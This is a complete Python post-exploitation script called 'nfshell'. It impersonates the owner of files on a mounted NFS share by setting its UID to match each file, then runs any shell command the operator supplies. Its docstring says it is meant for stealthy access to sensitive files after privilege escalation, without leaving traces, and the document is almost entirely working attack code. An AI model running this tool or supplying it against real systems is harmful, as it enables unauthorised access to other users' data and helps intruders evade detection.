#!/usr/bin/env python3
"""
nfshell - Stealthy file access on NFS shares after privilege escalation

This script adjusts the uid to match the file being accessed, allowing
interaction with files on the NFS share without changing ownership
(avoiding traces).

Usage:
    ./nfshell <command> <path>
    ./nfshell ls -la ./mount/
    ./nfshell cat ./mount/sensitive_file.txt

Source: https://www.errno.fr/nfs_privesc.html
"""

import sys
import os


def get_file_uid(filepath):
    """
    Get the UID of a file, or recursively check parent directories
    if the file doesn't exist.
    """
    try:
        uid = os.stat(filepath).st_uid
    except OSError:
        # Try parent directory
        parent = os.path.dirname(filepath)
        if parent and parent != filepath:
            return get_file_uid(parent)
        # Default to current user
        return os.getuid()
    return uid


def main():
    if len(sys.argv) < 3:
        print("Usage: nfshell <command> <path>")
        print("Example: ./nfshell ls -la ./mount/")
        sys.exit(1)

    # Get the file path (last argument)
    filepath = sys.argv[-1]
    
    # Get the UID of the file
    uid = get_file_uid(filepath)
    
    # Set our UID to match the file's UID
    os.setreuid(uid, uid)
    
    # Execute the command
    command = ' '.join(sys.argv[1:-1])
    os.system(command)


if __name__ == "__main__":
    main()
